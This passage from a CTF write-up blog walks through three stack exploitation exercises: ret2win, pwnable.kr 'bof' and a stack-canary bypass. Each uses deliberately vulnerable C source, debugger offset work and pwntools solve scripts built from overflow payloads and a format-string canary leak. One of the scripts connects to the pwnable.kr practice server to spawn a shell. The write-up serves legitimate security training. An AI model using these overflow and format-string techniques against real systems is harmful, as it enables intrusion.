0x00401030    1 6            sym.imp.puts
0x00401040    1 6            sym.imp.gets
0x004011e4    1 9            sym._fini
0x00401180    4 93           sym.__libc_csu_init
0x00401080    1 1            sym._dl_relocate_static_pie
0x0040115a    1 17           dbg.main
0x0040116b    1 19           dbg.flag					; THIS ONE
0x00401000    3 23           map._home_kali_Desktop_Study_PWN_etc_ret2win_vuln.r_x
</pre></td></tr></tbody></table></code></div></div>

<p>Using the built-in <code class="language-plaintext highlighter-rouge">grep</code>, radare should have the output optimized</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_12-02.png" alt="" /></p>

<h2 id="solvepy-1">Solve.py<a href="#solvepy-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Now that we have the padding length, control <code class="language-plaintext highlighter-rouge">RIP</code> and <code class="language-plaintext highlighter-rouge">flag()</code> address.</p>

<p>Hence, our final <code class="language-plaintext highlighter-rouge">solve.py</code>.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">flag_rip</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0040116b</span><span class="p">)</span>	<span class="c1"># pack flag_addr: \x6b\x11\x40\x00
</span><span class="n">padding</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">nop</span><span class="p">())</span> <span class="o">*</span> <span class="mi">56</span>	<span class="c1"># 56 bytes of NOP
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">flag_rip</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'me</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_13-22.png" alt="" /></p>

<hr />

<h1 id="pwnablekr---bof">Pwnable.kr - bof</h1>

<p><strong>Goal:</strong> Successfully modify the value of <code class="language-plaintext highlighter-rouge">key</code> to spawn a shell.</p>

<p>This is an original challenge at <a href="https://pwnable.kr/play.php">pwnable.kr</a>.</p>

<p>Description:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
</pre></td></tr></tbody></table></code></div></div>

<p>Provided source:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
</span><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
	<span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
	<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!</span>
	<span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span><span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
	<span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="code-breakdown-1">Code breakdown<a href="#code-breakdown-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>There are only two function, <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">func</code>.</p>

<p><code class="language-plaintext highlighter-rouge">main</code> basically calls <code class="language-plaintext highlighter-rouge">func</code> with <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> as its sole <code class="language-plaintext highlighter-rouge">key</code> argument whose value is to be compared with <code class="language-plaintext highlighter-rouge">0xcafebabe</code> and if true, spawns a shell or, otherwise, prints <code class="language-plaintext highlighter-rouge">Nah..\n</code>. Not to mention the obvious buffer overflow as <code class="language-plaintext highlighter-rouge">func</code> creates a 32 bytes buffer then reads it with <code class="language-plaintext highlighter-rouge">gets</code>.</p>

<h2 id="solution-2">Solution<a href="#solution-2"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Since we are not reproducing the challenge but downloading straight from the source, let us check its properties.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-14.png" alt="" /></p>

<p>Not a fan of radare2? Here is the simplified output from <a href="https://github.com/slimm609/checksec.sh">checksec</a>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-16.png" alt="" /></p>

<p>As it might be seen, the binary has NX, PIE, and canary bit enabled. Especially with stack canary, we are not able to determine the padding length with De Bruijn Sequence anymore. However, other protection bits are neither important nor able to interrupt our payload in this practice at all so I will skip them for now.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-17.png" alt="" /></p>

<p>Therefore, you have to evaluate these offsets manually.</p>

<p>First, set a breakpoint after the <code class="language-plaintext highlighter-rouge">gets</code> function because the subsequent instruction is the comparison of <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">0xcafebabe</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-23.png" alt="" /></p>

<p>Then locate our buffer offset, which is <code class="language-plaintext highlighter-rouge">0xffef8ffc</code>, apparently.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-25.png" alt="" /></p>

<p>And variable <code class="language-plaintext highlighter-rouge">key</code>’s offset, <code class="language-plaintext highlighter-rouge">0xffef9030</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-32.png" alt="" /></p>

<p>Evaluate this expression: <code class="language-plaintext highlighter-rouge">0xffef9030 - 0xffef8ffc = 0x34 = 52 (decimal) &lt;-- padding length</code>.</p>

<p>Also, you can try using this shortcut instead of those weary steps.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">[</span>0x5658662c]&gt;? <span class="sb">`</span>pxr 1 @ebp+8 ~[0]<span class="sb">`</span> - <span class="sb">`</span>dr eax<span class="sb">`</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-51.png" alt="" /></p>

<p>Hence, our skeleton payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = PADDING (52) + KEY_VALUE
</pre></td></tr></tbody></table></code></div></div>

<h2 id="solvepy-2">Solve.py<a href="#solvepy-2"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Either of these should work properly.</p>

<p>One-liner: <code class="language-plaintext highlighter-rouge">python -c"print(b'a'*52+b'\xbe\xba\xfe\xca')" | tee payload &amp;&amp; (cat payload &amp;&amp; cat)| nc pwnable.kr 9000</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_09-21.png" alt="" /></p>

<p>Pwntools:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mi">52</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="k">if</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'local'</span><span class="p">):</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./bof'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwnable.kr'</span><span class="p">,</span> <span class="mi">9000</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_12-07.png" alt="" /></p>

<hr />

<h1 id="canary-custom">Canary (custom)</h1>

<p><strong>Goal:</strong> Successfully bypass canary and call <code class="language-plaintext highlighter-rouge">win()</code>.</p>

<p>Source:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="c1">// Build: $ gcc canary.c -o canary -no-pie -fstack-protector -z execstack</span>
<span class="c1">// The option "-fstack-protector" enables canary</span>
<span class="c1">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux</span>

<span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
</span><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Leak me"</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Overflow me"</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"You won!"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This simple challenge ideally demonstrates how we can bypass stack protection, as know as stack canary.</p>

<p>But before being able to understand the crucial part, we should get hold of the protection bit first. To put it simply, at the prologue of a function, a random value is place onto the stack and before the program execute <code class="language-plaintext highlighter-rouge">ret</code>, the present value of that variable is to be compared with the initial and a <code class="language-plaintext highlighter-rouge">***stack smashing detected***</code> error message would show up thereafter if they are not the same; otherwise, exit normally.</p>

<p><strong>Note:</strong> <em>Stack canaries in Linux is a bit more tricky as they end in <code class="language-plaintext highlighter-rouge">00</code>, which will null-terminated any strings in case you make mistakes using print functions. Still, it makes them much easier to spot.</em></p>

<h2 id="code-breakdown-2">Code breakdown<a href="#code-breakdown-2"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>There are three functions: <code class="language-plaintext highlighter-rouge">main</code>, <code class="language-plaintext highlighter-rouge">vuln</code> and <code class="language-plaintext highlighter-rouge">win</code>.</p>

<p><code class="language-plaintext highlighter-rouge">win</code> is isolated and <code class="language-plaintext highlighter-rouge">main</code> merely calls <code class="language-plaintext highlighter-rouge">vuln</code>. <code class="language-plaintext highlighter-rouge">vuln</code>, however, reads a buffer of 32 bytes twice, before and after printing it using <code class="language-plaintext highlighter-rouge">puts</code>.</p>

<h2 id="solution-3">Solution<a href="#solution-3"><i class="fas fa-hashtag"></i></a></h2></h2>

<h3 id="1-brute-forcing">1. Brute-forcing<a href="#1-brute-forcing"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Please do remember that this method <strong>works exclusively with 32-bit programs</strong> and sometimes is the sole solution when there are no leak capabilities. Since it is, unfortunately, not practicable with our particular 64-bit binary, we will discuss the method further at another time.</p>

<h3 id="2-leaking-a-stack-canary">2. Leaking a Stack Canary<a href="#2-leaking-a-stack-canary"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>This method aim is to read the value of the canary through a certain <strong>format string leakages</strong>, such as <code class="language-plaintext highlighter-rouge">read</code>, <code class="language-plaintext highlighter-rouge">strncpy</code>, <code class="language-plaintext highlighter-rouge">puts</code> and <code class="language-plaintext highlighter-rouge">printf</code>.</p>

<p>A format string bug is a simple, yet, powerful auxiliary which if you can manipulate and leverage it to perform reading or even writing to arbitrary memory regions. Imagine you have a small code snippet as follows:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%x %x %x"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Expected output:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>40 40 40
</pre></td></tr></tbody></table></code></div></div>

<p>But supposing we have 3 format identifiers with only a single argument.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%x %x %x"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And we get:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>40 3c27ed48 61879738
</pre></td></tr></tbody></table></code></div></div>

<p>Not meet the expected amount of arguments, <code class="language-plaintext highlighter-rouge">printf</code> simply continues printing the next values on the stack, <em>thus leaking</em> them. Hence, the latter two, <code class="language-plaintext highlighter-rouge">3c27ed48</code> and <code class="language-plaintext highlighter-rouge">61879738</code>, are probably not our <code class="language-plaintext highlighter-rouge">int a = 64</code> but <em>random</em> junk value on the stack.</p>

<p>Let us have a glance at the vulnerable source again.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">vuln</span><span class="p">()</span><span class="o">:</span>
<span class="p">...</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"Leak me"</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Overflow me"</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">puts</code> function allows us to leak the canary, we then can use that value to overwrite the canary itself and finally call <code class="language-plaintext highlighter-rouge">win()</code> to achieve the initial goal.</p>

<p>Now to the most intriguing phase, let us load it in radare2 and in most practical cases, you should first check the protection properties of the binary. It either could be done using <a href="https://github.com/slimm609/checksec.sh">checksec</a> or <a href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/">rabin2</a>, whatever comes to your liking.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_12-49.png" alt="" /></p>

<p>Next, we want to set a breakpoint at the subsequent instruction near the first <code class="language-plaintext highlighter-rouge">gets</code> and a second breakpoint around the canary so that we can easily determine our canary offset.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_13-12.png" alt="" /></p>

<p>Executing the program and hit the first breakpoint at <code class="language-plaintext highlighter-rouge">0x00401163</code>, we are therefrom able to read the canary value. Furthermore, we can calculate the padding length between our buffer and the canary by evaluating <code class="language-plaintext highlighter-rouge">0x50 - 0x8 = 0x48 = 72 (decimal)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>[0x7f347597b050]&gt; s sym.vuln;pdf

┌ 133: sym.vuln ();
│           ; var int64_t var_50h @ rbp-0x50	; our 32-byte buffer
│           ; var int64_t var_8h @ rbp-0x8		; canary variable
...
│           0x0040115a      64488b042528.  mov rax, qword fs:[0x28]	; stored canary in RAX
│           0x00401163 b    488945f8       mov qword [var_8h], rax	; Breakpoint 1
...

[0x00401163]&gt; dr rax
0xdc9e3a07a36a200
[0x00401163]&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Our current canary value: <code class="language-plaintext highlighter-rouge">0xdc9e3a07a36a200</code></p>

<p>Then, we need to know how far is it from our buffer offset to the canary’s and in order to do so, let us hit the second breakpoint and read the stack.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-20.png" alt="" /></p>

<p>So the buffer is 15 addresses (or 64 bytes) from the canary, that is also the reason why <code class="language-plaintext highlighter-rouge">%15$p</code> is our input so that <code class="language-plaintext highlighter-rouge">puts</code> can print out the special sentinel value.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-26.png" alt="" /></p>

<p>And we successfully get the correct value of the canary.</p>

<p>Nevertheless, keep in mind that stack canaries are randomized for every new process, so we have to automate the canary leaking procedure as below:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./canary'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Leak me</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'%15$p'</span><span class="p">)</span>

<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Canary: %s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-45.png" alt="" /></p>

<p>And thus far we have had our skeleton payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (??) + WIN_OFFSET (??)
</pre></td></tr></tbody></table></code></div></div>

<p>In order to calculate <code class="language-plaintext highlighter-rouge">PAD_TIL_RIP</code>, let us get back to radare2 and set another breakpoint after the second <code class="language-plaintext highlighter-rouge">gets</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-33.png" alt="" /></p>

<p>Stop at the second breakpoint we have set at the beginning, here I want you to remember that our current canary offset is at <code class="language-plaintext highlighter-rouge">0x7fffb74f25c0+16 = 0x7fffb74f25d0</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-36.png" alt="" /></p>

<p>Follow the execution flow, we now hit the third breakpoint after <code class="language-plaintext highlighter-rouge">gets</code> then we examine the data chunk at <code class="language-plaintext highlighter-rouge">0x7fffb74f25d0</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-44.png" alt="" /></p>

<p>Using <a href="https://r2wiki.readthedocs.io/en/latest/tools/ragg2/">ragg2</a> pattern, we now know the RIP offset is 16 bytes from the canary’s start point, and the canary size is 8 (or 4 in 32-bit) bytes so our <code class="language-plaintext highlighter-rouge">PAD_TIL_RIP</code> is <code class="language-plaintext highlighter-rouge">16 - 8 = 8</code>.</p>

<p>And the last factor is <code class="language-plaintext highlighter-rouge">WIN_OFFSET</code>, you can dump it out either using objdump</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-56.png" alt="" /></p>

<p>or <code class="language-plaintext highlighter-rouge">afl~win</code> within radare2.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-57.png" alt="" /></p>

<h2 id="solvepy-3">Solve.py<a href="#solvepy-3"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>You finally made it here, congratulation.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (8) + WIN_OFFSET (0x004011ec)
</pre></td></tr></tbody></table></code></div></div>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./canary'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Leak me</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'%15$p'</span><span class="p">)</span>

<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Canary: %s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">nop</span><span class="p">())</span> <span class="o">*</span> <span class="mi">72</span>	<span class="c1"># PAD_TIL_CANARY
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>					<span class="c1"># CANARY
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">nop</span><span class="p">())</span> <span class="o">*</span> <span class="mi">8</span>	<span class="c1"># PAD_TIL_RIP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004011ec</span><span class="p">)</span>				<span class="c1"># WIN_OFFSET
</span>
